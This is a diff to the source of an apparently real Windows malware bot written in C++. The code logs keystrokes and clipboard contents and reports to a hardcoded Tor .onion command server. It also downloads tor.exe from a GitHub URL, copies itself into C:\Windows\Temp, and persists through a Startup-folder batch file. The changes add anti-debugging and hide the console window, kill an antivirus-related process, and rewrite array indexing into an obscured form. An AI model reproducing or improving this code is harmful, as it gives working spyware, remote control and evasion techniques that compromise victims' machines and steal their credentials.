@@ -12,11 +12,11 @@
 #include <filesystem>
 #include <wininet.h>
 #include <fcntl.h>
-#include <dirent.h>
+#include <psapi.h>
 #include <tlhelp32.h>
 
 #define MAX                 65536
-#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
+#define cnc_onion_server    "z2b5cjxk4utmaktdrwiz5qlzxqve5rjedmplqgrceutvmurwadlc4gqd.onion"
 
 HHOOK hHook;
 SOCKET fd;
@@ -88,7 +88,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
         if (wParam == WM_KEYDOWN) {
-            char key[3];
+            char key[4];
             DWORD vkCode = kbd->vkCode;
             if (vkCode >= 0x30 && vkCode <= 0x39) {
                 if (GetAsyncKeyState(VK_SHIFT)) {
@@ -367,7 +367,7 @@ int wget(HINTERNET hInet, const TCHAR* url, FILE* fp)
     for (;;){
         InternetReadFile(hUrl, buf, sizeof(buf), (LPDWORD)&len);
         if (len <= 0) break;
-        fwrite(buf, sizeof(buf[0]), len, fp);
+        fwrite(buf, sizeof(0[buf]), len, fp);
         size += len;
     }
     InternetCloseHandle(hUrl);
@@ -378,18 +378,12 @@ void wget()
 {
     HINTERNET hInet;
     HINTERNET hFile;
-
     FILE *fp;
-
     hInet = InternetOpen(TEXT("TEST"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-
     hFile = InternetOpenUrl(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), NULL, 0, 0, 0);
     if (hFile == NULL) return;
-
     fopen_s(&fp, "C:\\Windows\\Temp\\tor.exe", "wb");
-
     if (wget(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), fp) < 0) return;
-
     InternetCloseHandle(hFile);
     InternetCloseHandle(hInet);
     fclose(fp);
@@ -398,8 +392,8 @@ void wget()
 TCHAR *my_strcat(TCHAR *dest, const TCHAR *src)
 {
     size_t i, j;
-    for (j = 0 ; dest[j] != '\0'; j++);
-    for (i = 0 ; src[i] != '\0'; i++) dest[j + i] = src[i];
+    for (j = 0 ; j[dest] != '\0'; j++);
+    for (i = 0 ; i[src] != '\0'; i++) dest[j + i] = i[src];
     dest[j + i] = '\0';
     return dest;
 }
@@ -424,7 +418,7 @@ std::string ExeName() {
     return std::string(buffer);
 }
 
-inline void self_duplicating()
+void self_duplicating(int a)
 {
     std::string exename = ExeName();
     std::string path = ExePath();
@@ -439,6 +433,22 @@ inline void self_duplicating()
     close(target);
 }
 
+inline void self_duplicating()
+{
+    TCHAR cdir[512];
+    TCHAR BaseName[MAX_PATH];
+    TCHAR *backslash = (TCHAR*)"\\";
+    DWORD dwProcessId = GetCurrentProcessId();
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+    if (NULL != hProcess) {
+        GetModuleBaseName(hProcess, NULL, BaseName, _countof(BaseName));
+        CloseHandle(hProcess);
+    }
+    GetCurrentDirectory(255, cdir);
+    my_strcat(cdir, backslash);
+    if (CopyFile(cdir, "C:\\Windows\\Temp\\yuki.exe", FALSE) == FALSE) self_duplicating(1);
+}
+
 void start_up()
 {
     TCHAR path[512];
@@ -446,19 +456,21 @@ void start_up()
     TCHAR *d = (TCHAR*)"@echo\x20off\nC:\\Windows\\Temp\\yuki.exe 255";
     DWORD dwNumberOfBytesWritten;
     self_duplicating();
-f:
-    if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) {
-        my_strcat(path, s);
+    while (1) {
+        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) {
+            my_strcat(path, s);
+        }
+        HANDLE hFile = CreateFile(
+            path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
+            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
+        );
+        if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) {
+            continue;
+        }
+        CloseHandle(hFile);
+        wget();
+        break;
     }
-    HANDLE hFile = CreateFile(
-        path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
-        CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
-    );
-    if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) {
-        goto f;
-    }
-    CloseHandle(hFile);
-    wget();
 }
 
 int main(int argc, char **argv)
@@ -466,10 +478,12 @@ int main(int argc, char **argv)
     HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
     if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;
 
-    //FreeConsole();
+    //FreeConsole(); 
     AllocConsole();
     HWND window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
+
+    if (IsDebuggerPresent()) ExitProcess(1);
 
     if (argc != 2) {
         StopAV("WmiPrvSE.exe");
@@ -512,9 +526,7 @@ int main(int argc, char **argv)
 
         char Resp1[2];
         recv(Socket, Resp1, 2, 0);
-        if(Resp1[1] != 0x00) {
-            continue;
-        }
+        if (1[Resp1] != 0x00) continue;
 
         char Domain[] = cnc_onion_server;
         char  DomainLen = (char)strlen(Domain);
@@ -540,9 +552,7 @@ int main(int argc, char **argv)
 
         char Resp2[10];
         recv(Socket, Resp2, 10, 0);
-        if(Resp2[1] != 0x00) {
-            continue;
-        }
+        if (1[Resp2] != 0x00) continue;
 
         std::filesystem::path path = std::filesystem::current_path();
         std::string path_string{path.u8string()};
@@ -577,6 +587,7 @@ int main(int argc, char **argv)
             }
             else if (!strcmp(recv_buf, "all_log")) {
                 std::thread th_0(keylog);
+                th_0.join();
                 OpenClipboard(NULL);
                 hClip = GetClipboardData(CF_TEXT);
                     if (hClip != NULL) {
@@ -592,14 +603,13 @@ int main(int argc, char **argv)
                 }
                 Sleep(-1);
             }
+            //else if (!strcmp(recv_buf, "all_log")) {
+            //}
             send(Socket, send_buf, strlen(send_buf), 0);
-            memset(send_buf, 0, MAX*sizeof(send_buf[0]));
+            memset(send_buf, 0, MAX*sizeof(0[send_buf]));
         }
     }
-
     closesocket(Socket);
-
     WSACleanup();
-
     return 0;
 }
